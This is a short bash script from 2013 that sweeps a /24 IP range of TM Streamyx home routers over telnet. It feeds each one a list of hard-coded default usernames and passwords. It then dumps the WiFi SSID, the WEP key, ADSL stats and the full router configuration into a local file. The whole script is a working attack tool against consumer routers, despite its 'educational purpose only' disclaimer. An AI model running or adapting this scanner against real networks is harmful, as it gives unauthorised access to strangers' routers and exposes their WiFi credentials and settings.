#!/usr/bin/env bash 
# tm streamyx router scanner
# test router default login and dump config
# if telnet is accessible to public
# similar tool / inspired by: https://github.com/shahril96/TM-Punk/
# weldan <mweldan@gmail.com>, 2013
# for educational purpose only  

if [ $# -eq 0 ]
then
    clear
    echo "#"
    echo "#"
    echo "# tm streamyx router telnet scanner"
    echo "###################################"
    echo "usage: $0 ip"
    echo "will scan entire ip range"
    echo "raw output will be stored in output.txt"
    echo "will grab these informations:"
    echo "- wifi login"
    echo "- adsl stat"
    echo "- router configuration"
    echo "###################################"
    echo "written to demonstrate flaw only, use at your own risk"
    echo ""
    exit
fi

ip=$1
IFS=. read -a array <<< "$ip"
for i in {1..254}
do
(
echo open ${array[0]}.${array[1]}.${array[2]}.${i}
sleep 2
echo "support"
sleep 1
echo "support"
sleep 1
echo "support"
sleep 1
echo ""
sleep 1
echo "admin"
sleep 1
echo "tmadmin"
sleep 1
echo "tmadmin"
sleep 1
echo "admin"
sleep 1
echo "admin"
sleep 1
echo "admin"
sleep 1
echo "tmuser"
sleep 1
echo "tmuser"
sleep 1
echo "tmbusiness"
sleep 1
echo "tmbusiness"
sleep 1
echo "tmuser"
sleep 1
echo "tmbusiness"
sleep 1
echo "tmadmin"
sleep 1
echo "tmbusiness"
sleep 1
echo "wifissid"
sleep 1
echo ""
echo "wifiwepkey"
sleep 1
echo ""
echo "adslstat"
sleep 1
echo ""
echo "dumpcfg"
sleep 1
echo ""
echo "quit"
sleep 1
) | telnet >>./output.txt
done
